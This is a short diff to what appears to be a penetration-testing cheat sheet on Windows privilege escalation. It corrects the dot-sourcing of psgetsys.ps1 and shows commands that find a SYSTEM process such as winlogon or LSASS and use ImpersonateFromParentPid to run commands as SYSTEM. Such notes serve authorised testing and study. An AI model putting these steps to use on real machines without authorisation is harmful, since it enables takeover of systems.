@@ -536,7 +536,7 @@ Powershell to get RCE
 >grab the PID of a well-known process that runs as SYSTEM (such as LSASS and winlogon - tasklist | findstr "winlogon")
 ```
 Must in elevated command prompt
-..\psgetsys.ps1
+. .\psgetsys.ps1(. . means dot sourcing the script)
 ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
 ```
 
